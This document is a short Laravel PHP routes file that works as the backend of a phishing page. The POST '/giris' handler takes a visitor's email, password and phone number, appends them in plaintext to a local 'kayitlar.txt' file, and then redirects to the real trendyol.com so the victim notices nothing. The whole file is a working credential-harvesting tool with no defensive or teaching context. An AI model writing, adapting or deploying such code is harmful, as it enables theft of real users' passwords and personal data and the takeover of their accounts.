<?php

use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return view('giris');
});
Route::post('/giris', function(Illuminate\Http\Request $request) {
    $email = $request->input('email');
    $sifre = $request->input('sifre');
    $telefon = $request->input('telefon');
    file_put_contents(storage_path('app/kayitlar.txt'), "$email | $sifre | $telefon\n", FILE_APPEND);
    return redirect('https://www.trendyol.com/');
});
